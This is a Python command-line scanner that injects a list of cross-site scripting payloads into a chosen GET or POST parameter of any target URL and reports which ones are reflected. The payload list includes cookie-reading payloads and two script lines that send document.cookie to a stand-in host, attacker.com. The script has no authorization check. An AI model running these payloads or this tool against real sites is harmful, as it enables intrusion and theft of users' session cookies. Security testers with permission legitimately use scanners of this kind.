import requests
import argparse
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

# Expanded XSS payload list with cookie stealing attempts and common bypasses
xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '<img src=x onerror=alert(document.cookie)>',
    '<svg/onload=alert(document.cookie)>',
    '"><svg/onload=alert(document.cookie)>',
    '<body onload=alert(document.cookie)>',
    '<iframe src="javascript:alert(document.cookie)"></iframe>',
    '"><img src=x onerror=alert(1)>',
    '<math><maction xlink:href="javascript:alert(document.cookie)"></maction></math>',
    '<video><source onerror=alert(document.cookie)></video>',
    '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
    '"><script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
]

def inject_payload_get(url, param, payload):
    parsed_url = urlparse(url)
    query_params = dict(parse_qsl(parsed_url.query))
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed_url._replace(query=new_query))
    return new_url

def test_xss_get(url, param):
    vulnerable = False
    print(f"[*] Testing GET parameter '{param}' for XSS...")
    for payload in xss_payloads:
        test_url = inject_payload_get(url, param, payload)
        try:
            resp = requests.get(test_url, timeout=10)
            if payload in resp.text:
                print(f"[+] Possible XSS vulnerability with payload:\n{payload}\nURL: {test_url}\nStatus: {resp.status_code}\n")
                vulnerable = True
            else:
                print(f"[-] Payload not reflected: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")
    if not vulnerable:
        print("[-] No XSS vulnerabilities detected on GET parameter.")
    return vulnerable

def test_xss_post(url, param, data):
    vulnerable = False
    print(f"[*] Testing POST parameter '{param}' for XSS...")
    if param not in data:
        print(f"[-] Parameter '{param}' not found in POST data.")
        return False

    for payload in xss_payloads:
        post_data = data.copy()
        post_data[param] = payload
        try:
            resp = requests.post(url, data=post_data, timeout=10)
            if payload in resp.text:
                print(f"[+] Possible XSS vulnerability with payload:\n{payload}\nPOST data: {post_data}\nStatus: {resp.status_code}\n")
                vulnerable = True
            else:
                print(f"[-] Payload not reflected: {payload}")
        except Exception as e:
            print(f"Request failed for payload {payload}: {e}")
    if not vulnerable:
        print("[-] No XSS vulnerabilities detected on POST parameter.")
    return vulnerable

def parse_post_data(data_str):
    data = {}
    for pair in data_str.split('&'):
        if '=' in pair:
            k,v = pair.split('=',1)
            data[k] = v
        else:
            data[pair] = ''
    return data

def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner with GET/POST support")
    parser.add_argument('url', help='Target URL (e.g., http://example.com/page?param=value)')
    parser.add_argument('param', help='Parameter name to test for XSS')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use')
    parser.add_argument('--data', help='POST data parameters (key=value&key2=value2), required for POST')

    args = parser.parse_args()

    if args.method == 'POST':
        if not args.data:
            print("[-] POST method requires --data argument")
            return
        post_data = parse_post_data(args.data)
        test_xss_post(args.url, args.param, post_data)
    else:
        test_xss_get(args.url, args.param)

if __name__ == "__main__":
    main()
